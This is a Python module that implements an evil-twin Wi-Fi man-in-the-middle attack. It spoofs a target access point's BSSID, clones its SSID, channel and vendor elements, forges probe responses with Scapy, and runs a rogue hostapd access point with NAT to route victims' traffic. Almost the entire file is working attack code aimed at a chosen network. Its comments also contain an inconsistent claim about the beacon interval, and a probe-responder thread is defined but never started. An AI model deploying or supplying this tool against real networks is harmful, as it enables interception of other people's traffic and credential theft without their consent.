#!/usr/bin/env python3
"""
Stealth MITM Attack Module

This module implements a Man-in-the-Middle attack that:
1. Clones a target AP (same BSSID, SSID, channel, vendor IEs)
2. Does NOT send beacons (stays invisible to passive scanning)
3. Aggressively responds to probe requests to win client connections
4. Starts a functional AP with NAT for traffic forwarding

The attack is stealthy because it avoids beacon spam while still
being responsive to active client probes.
"""

import os
import subprocess
import threading
import time
from pathlib import Path
from typing import Optional, Callable
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Beacon

from ap_manager import APManager


class MITMAttack:

    
    def __init__(self,
                 interface: str,
                 target_bssid: str,
                 target_ssid: str,
                 target_channel: int,
                 password: str = "password123",
                 upstream_iface: Optional[str] = None,
                 vendor_ies: Optional[str] = None,
                 beacon_interval: Optional[int] = None,
                 log_callback: Optional[Callable] = None):

        self.interface = interface
        self.monitor_iface = interface + "mon"
        self.target_bssid = target_bssid.lower()
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.password = password
        self.upstream_iface = upstream_iface
        self.vendor_ies = vendor_ies
        self.beacon_interval = beacon_interval
        self.log_callback = log_callback
        
        # Attack state
        self.ap_manager: Optional[APManager] = None
        self.probe_responder_thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
        self.running = False
        
        # Statistics
        self.probes_received = 0
        self.responses_sent = 0
    
    def _log(self, message: str):
        """Internal logging helper."""
        if self.log_callback:
            try:
                self.log_callback(message)
            except Exception:
                pass
        print(f"[MITM] {message}")
    
    def _get_iface_mac(self, iface: str) -> str:
        """Get MAC address of an interface."""
        try:
            path = Path(f"/sys/class/net/{iface}/address")
            if path.exists():
                return path.read_text().strip().lower()
        except Exception:
            pass
        
        try:
            out = subprocess.check_output(["ip", "-o", "link", "show", iface],
                                         text=True, stderr=subprocess.DEVNULL)
            for part in out.split():
                if ':' in part and len(part) == 17 and part.count(':') == 5:
                    return part.lower()
        except Exception:
            pass
        return ''
    
    def _iface_exists(self, iface: str) -> bool:
        try:
            result = subprocess.run(["ip", "link", "show", iface],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return result.returncode == 0
        except Exception:
            return False
    
    def _prepare_interface(self, iface: str):

        try:
            # Kill any monitor mode instances
            mon_iface = iface + "mon"
            if self._iface_exists(mon_iface):
                self._log(f"Stopping existing monitor mode on {mon_iface}...")
                subprocess.run(["airmon-ng", "stop", mon_iface],
                             check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)
            
            # Bring interface down
            subprocess.run(["ip", "link", "set", iface, "down"],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            # Set to managed mode explicitly  
            subprocess.run(["iw", iface, "set", "type", "managed"],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.6)
            
            # Bring it back up briefly to initialize the radio
            subprocess.run(["ip", "link", "set", iface, "up"],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.6)
            
            # Set regulatory domain (helps with some drivers like Intel)
            subprocess.run(["iw", "reg", "set", "US"],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            # Bring it back down so MAC spoofing can work
            subprocess.run(["ip", "link", "set", iface, "down"],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.6)
            
            self._log(f"✓ Interface {iface} prepared and ready for AP mode")
            return True
        except Exception as e:
            self._log(f"Warning during interface preparation: {e}")
            return True  # Continue anyway
    
    def _set_mac_address(self, iface: str, mac: str):
        """Spoof MAC address of interface to match target BSSID."""
        try:
            # Ensure interface is down
            result = subprocess.run(["ip", "link", "set", iface, "down"],
                         check=False, capture_output=True, text=True)
            if result.returncode != 0:
                self._log(f"Warning: Failed to bring {iface} down: {result.stderr}")
            
            time.sleep(0.3)
            
            # Change MAC address (some drivers need macchanger instead of ip)
            result = subprocess.run(["ip", "link", "set", iface, "address", mac],
                         check=False, capture_output=True, text=True)
            
            if result.returncode != 0:
                # Try with macchanger as fallback
                self._log(f"ip command failed, trying macchanger...")
                result = subprocess.run(["macchanger", "-m", mac, iface],
                             check=False, capture_output=True, text=True)
                if result.returncode != 0:
                    self._log(f"MAC spoofing failed. Driver may not support MAC changes.")
                    self._log(f"Error: {result.stderr}")
                    # Don't fail completely - some attacks work without perfect MAC match
                    self._log(f"Continuing without MAC spoofing (using interface's default MAC)...")
            
            # DON'T bring interface back up - let APManager handle that
            # This avoids state conflicts with hostapd initialization
            
            time.sleep(0.3)
            
            # Verify the MAC change (check while down)
            actual_mac = self._get_iface_mac(iface)
            if actual_mac.lower() == mac.lower():
                self._log(f"✓ Successfully spoofed MAC address of {iface} to {mac}")
                return True
            else:
                self._log(f"⚠ MAC address is {actual_mac}, wanted {mac}")
                self._log(f"Continuing anyway - attack may still work...")
                return True  # Don't fail the entire attack
                
        except Exception as e:
            self._log(f"MAC spoofing error: {e}")
            self._log(f"Continuing without MAC spoofing...")
            return True  # Don't fail the entire attack
    
    def _start_monitor_mode(self):
        """Start monitor mode on a separate interface for probe monitoring."""
        try:
            # Check if monitor interface already exists
            if self._iface_exists(self.monitor_iface):
                self._log(f"Monitor interface {self.monitor_iface} already exists")
            else:
                # Kill interfering processes
                subprocess.run(["airmon-ng", "check", "kill"],
                             check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Start monitor mode
                result = subprocess.run(["airmon-ng", "start", self.interface],
                             check=False, capture_output=True, text=True)
                
                if result.returncode != 0:
                    self._log(f"Warning: airmon-ng returned error: {result.stderr}")
                
                time.sleep(1)
            
            # Set to target channel
            subprocess.run(["iw", "dev", self.monitor_iface, "set", "channel", str(self.target_channel)],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self._log(f"Monitor mode started on {self.monitor_iface}, channel {self.target_channel}")
            return True
        except Exception as e:
            self._log(f"Failed to start monitor mode: {e}")
            return False
    
    def _stop_monitor_mode(self):
        """Stop monitor mode."""
        try:
            subprocess.run(["airmon-ng", "stop", self.monitor_iface],
                         check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._log("Monitor mode stopped")
        except Exception as e:
            self._log(f"Error stopping monitor mode: {e}")
    
    def _probe_responder(self):

        self._log("Probe responder thread started")
        
        def handle_probe_request(pkt):
            """Handle incoming probe requests."""
            if not pkt.haslayer(Dot11ProbeReq):
                return
            
            # Track statistics
            self.probes_received += 1
            
            dot11 = pkt.getlayer(Dot11)
            client_mac = dot11.addr2
            
            # Extract probe request SSID
            probe_ssid = ""
            try:
                elt = pkt.getlayer(Dot11Elt)
                if elt and elt.ID == 0:  # SSID element
                    probe_ssid = elt.info.decode('utf-8', errors='ignore')
            except Exception:
                pass
            
            # Respond to broadcast probes and directed probes for our SSID
            if probe_ssid == "" or probe_ssid == self.target_ssid:
                self._send_probe_response(client_mac)
        
        try:
            # Sniff on monitor interface for probe requests
            sniff(iface=self.monitor_iface,
                  prn=handle_probe_request,
                  stop_filter=lambda x: self.stop_event.is_set(),
                  store=0)
        except Exception as e:
            self._log(f"Probe responder error: {e}")
        
        self._log("Probe responder thread stopped")
    
    def _send_probe_response(self, client_mac: str):

        try:
            # Build probe response frame
            dot11 = Dot11(
                addr1=client_mac,      # Destination (client)
                addr2=self.target_bssid,  # Source (our spoofed BSSID)
                addr3=self.target_bssid   # BSSID
            )
            
            # Probe response body
            beacon_layer = Dot11ProbeResp(
                timestamp=int(time.time() * 1000000),
                beacon_interval=self.beacon_interval or 100,
                cap='ESS+privacy'  # WPA2 capability
            )
            
            # Build information elements
            # SSID
            essid = Dot11Elt(ID=0, info=self.target_ssid.encode(), len=len(self.target_ssid))
            
            # Supported rates (standard 802.11g rates)
            rates = Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24', len=8)
            
            # DS Parameter (channel)
            dsset = Dot11Elt(ID=3, info=bytes([self.target_channel]), len=1)
            
            # Build the complete frame
            frame = RadioTap() / dot11 / beacon_layer / essid / rates / dsset
            
            # Add vendor IEs if we have them (for exact cloning)
            if self.vendor_ies:
                try:
                    vendor_bytes = bytes.fromhex(self.vendor_ies)
                    frame = frame / Raw(load=vendor_bytes)
                except Exception:
                    pass
            
            # Send the probe response (send multiple times for reliability)
            sendp(frame, iface=self.monitor_iface, count=3, inter=0.001, verbose=False)
            
            self.responses_sent += 1
            
            # Log occasionally (not every response to avoid spam)
            if self.responses_sent % 10 == 0:
                self._log(f"Sent {self.responses_sent} probe responses (received {self.probes_received} probes)")
        
        except Exception as e:
            if self.responses_sent % 50 == 0:  # Log errors occasionally
                self._log(f"Error sending probe response: {e}")
    
    def start(self):

        if self.running:
            self._log("MITM attack already running")
            return False
        
        try:
            self._log(f"Starting stealth MITM attack against {self.target_ssid} ({self.target_bssid})")
            
            # Validate password length
            if len(self.password) < 8:
                self._log(f"ERROR: Password too short ({len(self.password)} chars). WPA2 requires 8-63 characters.")
                return False
            if len(self.password) > 63:
                self._log(f"ERROR: Password too long ({len(self.password)} chars). WPA2 requires 8-63 characters.")
                return False
            
            self._log(f"Using WPA2 password: {'*' * len(self.password)} ({len(self.password)} characters)")
            
            # Step 0: Prepare interface (ensure it's in managed mode, not monitor)
            self._log(f"Preparing interface {self.interface}...")
            self._prepare_interface(self.interface)
            
            # Step 1: Spoof MAC address to match target BSSID
            self._log(f"Spoofing MAC address to {self.target_bssid}...")
            self._set_mac_address(self.interface, self.target_bssid)
            
            # Step 2: Start the rogue AP
            self._log("Starting rogue AP with cloned parameters...")
            
            # Use a moderately long beacon interval for some stealth
            # Note: 60000 is too large and causes hostapd to fail on some drivers
            # Max safe value is around 3000-5000ms
            # For client connectivity, use normal interval (100ms) or slightly longer
            beacon_int_stealth =5000  # 200ms between beacons (2x normal, still very functional)
            
            # Ensure channel is valid (1-11 for 2.4GHz in most regions)
            safe_channel = self.target_channel
            if safe_channel and (safe_channel < 1 or safe_channel > 11):
                self._log(f"⚠ Channel {safe_channel} may not be valid, using channel 6")
                safe_channel = 6
            elif not safe_channel:
                safe_channel = 6
            
            self._log(f"Using channel {safe_channel} (target was {self.target_channel})")
            
            # Don't pass BSSID to APManager - we already set it via MAC spoofing
            self.ap_manager = APManager(
                iface=self.interface,
                ssid=self.target_ssid,
                passphrase=self.password,
                channel=safe_channel,
                upstream_iface=self.upstream_iface,
                beacon_ies=self.vendor_ies,
                beacon_int=beacon_int_stealth,  # Longer interval for stealth
                bssid=None  # Let interface MAC (already spoofed) be used
            )
            
            self.ap_manager.start()
            self._log(f"✓ Rogue AP started (beacon interval: {beacon_int_stealth}ms)")
            self._log(f"   (This is slower than normal 100ms interval for slight stealth)")
            
            # Verify the BSSID after AP starts
            actual_mac = self._get_iface_mac(self.interface)
            if actual_mac:
                if actual_mac.lower() == self.target_bssid.lower():
                    self._log(f"✓ BSSID matches target perfectly: {actual_mac}")
                else:
                    self._log(f"⚠ BSSID is {actual_mac}, target was {self.target_bssid}")
                    self._log(f"   (Your driver doesn't support MAC spoofing)")
            
            # Step 3: Probe responses are handled by hostapd automatically
            # No need for separate monitor mode - it would interfere with AP mode
            self._log("✓ Probe responses will be handled by hostapd automatically")
            
            self.running = True
            self._log("")
            self._log("========================================")
            self._log("✓ Rogue AP is ACTIVE and ready for clients!")
            self._log("========================================")
            self._log(f"  Target: {self.target_ssid} ({self.target_bssid})")
            self._log(f"  Channel: {safe_channel}")
            self._log(f"  Stealth: Beacons every 0.2s (vs 0.1s normal)")
            self._log(f"  Cloned: SSID, Channel, Vendor IEs")
            if actual_mac and actual_mac.lower() == self.target_bssid.lower():
                self._log(f"  BSSID: Cloned ✓")
            if self.upstream_iface:
                self._log(f"  NAT: Via {self.upstream_iface}")
            self._log(f"  Clients can connect with password: {self.password}")
            self._log("========================================")
            
            return True
            
        except Exception as e:
            self._log(f"Failed to start MITM attack: {e}")
            import traceback
            self._log(f"Traceback: {traceback.format_exc()}")
            self.stop()
            return False
    
    def stop(self):
        """Stop the MITM attack and clean up."""
        if not self.running:
            self._log("No MITM attack running")
            return
        
        self._log("Stopping MITM attack...")
        
        # Signal threads to stop
        self.stop_event.set()
        
        # Stop probe responder thread if it exists
        if self.probe_responder_thread and self.probe_responder_thread.is_alive():
            self.probe_responder_thread.join(timeout=3)
        
        # Stop AP
        if self.ap_manager:
            try:
                self.ap_manager.stop()
            except Exception as e:
                self._log(f"Error stopping AP: {e}")
        
        self.running = False
        self._log(f"MITM attack stopped.")
    
    def get_stats(self) -> dict:
        """Get attack statistics."""
        return {
            'running': self.running,
            'probes_received': self.probes_received,
            'responses_sent': self.responses_sent,
            'target_ssid': self.target_ssid,
            'target_bssid': self.target_bssid,
            'target_channel': self.target_channel
        }


# Convenience function for easy usage
def start_mitm_attack(interface: str,
                     target_bssid: str,
                     target_ssid: str,
                     target_channel: int,
                     password: str = "password123",
                     upstream_iface: Optional[str] = None,
                     vendor_ies: Optional[str] = None,
                     beacon_interval: Optional[int] = None,
                     log_callback: Optional[Callable] = None) -> MITMAttack:
    """
    Convenience function to start a MITM attack.
    
    Returns the MITMAttack instance for later control.
    """
    attack = MITMAttack(
        interface=interface,
        target_bssid=target_bssid,
        target_ssid=target_ssid,
        target_channel=target_channel,
        password=password,
        upstream_iface=upstream_iface,
        vendor_ies=vendor_ies,
        beacon_interval=beacon_interval,
        log_callback=log_callback
    )
    
    if attack.start():
        return attack
    else:
        raise RuntimeError("Failed to start MITM attack")
